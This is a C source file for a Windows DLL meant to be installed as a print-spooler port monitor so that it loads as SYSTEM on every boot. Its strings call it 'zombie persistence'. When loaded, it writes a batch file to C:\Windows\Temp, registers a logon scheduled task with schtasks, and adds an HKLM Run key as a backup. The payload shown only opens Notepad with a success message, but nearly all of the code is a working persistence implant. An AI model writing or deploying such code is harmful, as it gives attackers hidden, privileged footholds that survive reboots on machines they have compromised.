#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h>  // Add this header for SHGetFolderPath

// Export both required functions
__declspec(dllexport) BOOL WINAPI InitializePrintMonitor(LPVOID pMonitorInit, LPVOID hSpooler, LPVOID pRegistryPath);
__declspec(dllexport) BOOL WINAPI InitializePrintMonitor2(LPVOID pMonitorInit, LPVOID hSpooler, LPVOID pRegistryPath);

// Global flag to track initialization
BOOL g_bInitialized = FALSE;

// Function to create comprehensive boot indicator
void CreateBootSuccessIndicator() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    // Create boot success file
    FILE* success = fopen("C:\\Windows\\Temp\\boot_success.txt", "w");
    if (success) {
        fprintf(success, "=== BOOT SUCCESS - ZOMBIE PERSISTENCE ACTIVE ===\n\n");
        fprintf(success, "Boot Time: %04d-%02d-%02d %02d:%02d:%02d\n", 
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        fprintf(success, "DLL: monitor_dll.dll\n");
        fprintf(success, "Loaded By: Print Spooler Service (spoolsv.exe)\n");
        fprintf(success, "Privilege Level: SYSTEM\n");
        fprintf(success, "Persistence: ACTIVE ON EVERY BOOT\n");
        fprintf(success, "UI Component: Will activate AFTER system fully loads\n");
        fprintf(success, "Status: ZOMBIE LOADED SUCCESSFULLY - WAITING FOR SYSTEM READY\n\n");
        fclose(success);
    }
    
    // Detailed boot log
    FILE* log = fopen("C:\\Windows\\Temp\\zombie_boot.log", "a");
    if (log) {
        fprintf(log, "[BOOT] DLL loaded successfully at %02d:%02d:%02d\n", 
                st.wHour, st.wMinute, st.wSecond);
        fprintf(log, "[PERSISTENCE] Port monitor technique active\n");
        fprintf(log, "[CONTEXT] Running as SYSTEM in session 0\n");
        fprintf(log, "[UI] Will trigger UI components AFTER system fully loads\n");
        fclose(log);
    }
}

// Function to create delayed scheduled task that runs AFTER system is fully loaded
BOOL CreateDelayedUIScheduledTask() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char commandLine[2048];
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Create a comprehensive batch file that waits for system to be fully ready
    FILE* batch = fopen("C:\\Windows\\Temp\\ultimate_ui_delayed.bat", "w");
    if (batch) {
        fprintf(batch, "@echo off\n");
        fprintf(batch, "title Ultimate Monitor - Zombie Persistence Active\n");
        fprintf(batch, "echo [ULTIMATE MONITOR] Waiting for system to fully load...\n");
        fprintf(batch, "echo [STATUS] System boot detected - waiting for complete initialization...\n");
        
        // Wait for system to be fully ready (30 seconds delay)
        fprintf(batch, "timeout /t 30 /nobreak >nul\n");
        fprintf(batch, "echo [SYSTEM READY] Operating system fully loaded\n");
        fprintf(batch, "echo [INITIALIZING] Starting zombie persistence verification...\n");
        fprintf(batch, "timeout /t 5 /nobreak >nul\n");
        
        // Create Notepad success file with current time (after delay)
        fprintf(batch, "echo Hello World! > C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo. >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo === SYSTEM FULLY LOADED SUCCESS === >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo. >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo Zombie Persistence: ACTIVE >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo DLL: monitor_dll.dll >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo Loaded By: Print Spooler Service >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo Privilege: SYSTEM >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo Technique: Port Monitor >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo System Load Time: %%date%% %%time%% >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo UI Trigger: AFTER system fully loaded >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo. >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        fprintf(batch, "echo This message appears AFTER system fully loads on EVERY restart! >> C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        
        // Open Notepad with the success file
        fprintf(batch, "start notepad.exe C:\\Windows\\Temp\\notepad_success_delayed.txt\n");
        
        // Show success in CMD
        fprintf(batch, "echo [SUCCESS] Zombie persistence verified!\n");
        fprintf(batch, "echo [INFO] DLL loaded automatically during boot\n");
        fprintf(batch, "echo [INFO] Port monitor technique active\n");
        fprintf(batch, "echo [INFO] System fully loaded before UI display\n");
        fprintf(batch, "echo [INFO] Persistence: GUARANTEED\n");
        fprintf(batch, "echo.\n");
        fprintf(batch, "echo This CMD window and Notepad appear AFTER system fully loads!\n");
        fprintf(batch, "echo.\n");
        fprintf(batch, "echo Press any key to close this window...\n");
        fprintf(batch, "pause >nul\n");
        fclose(batch);
    }
    
    // Create scheduled task with 1-minute delay after logon to ensure system is ready
    snprintf(commandLine, sizeof(commandLine),
        "schtasks /create /tn \"UltimateMonitorDelayedUI\" /tr \"C:\\Windows\\Temp\\ultimate_ui_delayed.bat\" /sc onlogon /delay 0001:00 /f");
    
    if (CreateProcessA(NULL, commandLine, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        FILE* log = fopen("C:\\Windows\\Temp\\delayed_task_creation.log", "a");
        if (log) {
            fprintf(log, "[TASK] Delayed UI scheduled task created (1-minute delay)\n");
            fclose(log);
        }
        return TRUE;
    }
    
    return FALSE;
}

// Function to create Run registry entry as backup method
void CreateRunRegistryEntry() {
    HKEY hKey;
    const char* subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    // Set for all users (machine-wide) - this will run when any user logs in
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        const char* command = "C:\\Windows\\Temp\\ultimate_ui_delayed.bat";
        RegSetValueExA(hKey, "UltimateMonitorDelayed", 0, REG_SZ, 
                      (const BYTE*)command, strlen(command));
        RegCloseKey(hKey);
        
        FILE* log = fopen("C:\\Windows\\Temp\\registry_set.log", "a");
        if (log) {
            fprintf(log, "[REGISTRY] Run entry created in HKLM for delayed UI\n");
            fclose(log);
        }
    }
}

// Function to trigger UI components that wait for system to be fully ready
void TriggerDelayedUIComponents() {
    // Create delayed scheduled task for future logons (primary method)
    CreateDelayedUIScheduledTask();
    
    // Create Run registry entries as backup
    CreateRunRegistryEntry();
    
    // Log the attempt
    FILE* log = fopen("C:\\Windows\\Temp\\ui_trigger_delayed.log", "a");
    if (log) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(log, "[DELAYED TRIGGER] UI components configured at %02d:%02d:%02d\n", 
                st.wHour, st.wMinute, st.wSecond);
        fprintf(log, "[METHOD] Delayed scheduled task (1-minute delay) + Run registry\n");
        fclose(log);
    }
}

// Main initialization function
void InitializeZombiePersistence() {
    // Prevent multiple initializations
    if (g_bInitialized) return;
    g_bInitialized = TRUE;
    
    // Create boot success indicator
    CreateBootSuccessIndicator();
    
    // Small delay to ensure system is stable
    Sleep(3000);
    
    // Trigger UI components that will activate AFTER system fully loads
    TriggerDelayedUIComponents();
    
    // Log completion
    FILE* log = fopen("C:\\Windows\\Temp\\zombie_complete.log", "a");
    if (log) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(log, "[INIT] Zombie persistence initialization completed at %02d:%02d:%02d\n", 
                st.wHour, st.wMinute, st.wSecond);
        fprintf(log, "[UI] UI will appear AFTER system fully loads\n");
        fclose(log);
    }
}

// DLL Main Entry Point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Disable DLL_THREAD_ATTACH and DLL_THREAD_DETACH for better performance
            DisableThreadLibraryCalls(hinstDLL);
            // Initialize in separate thread to avoid blocking spooler
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InitializeZombiePersistence, NULL, 0, NULL);
            break;
            
        case DLL_PROCESS_DETACH:
            // Cleanup if needed
            break;
    }
    return TRUE;
}

// Required port monitor functions
BOOL WINAPI InitializePrintMonitor(LPVOID pMonitorInit, LPVOID hSpooler, LPVOID pRegistryPath) {
    FILE* log = fopen("C:\\Windows\\Temp\\port_monitor.log", "a");
    if (log) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(log, "[MONITOR] InitializePrintMonitor called at %02d:%02d:%02d\n", 
                st.wHour, st.wMinute, st.wSecond);
        fclose(log);
    }
    return TRUE;
}

BOOL WINAPI InitializePrintMonitor2(LPVOID pMonitorInit, LPVOID hSpooler, LPVOID pRegistryPath) {
    FILE* log = fopen("C:\\Windows\\Temp\\port_monitor.log", "a");
    if (log) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(log, "[MONITOR] InitializePrintMonitor2 called at %02d:%02d:%02d\n", 
                st.wHour, st.wMinute, st.wSecond);
        fclose(log);
    }
    return TRUE;
}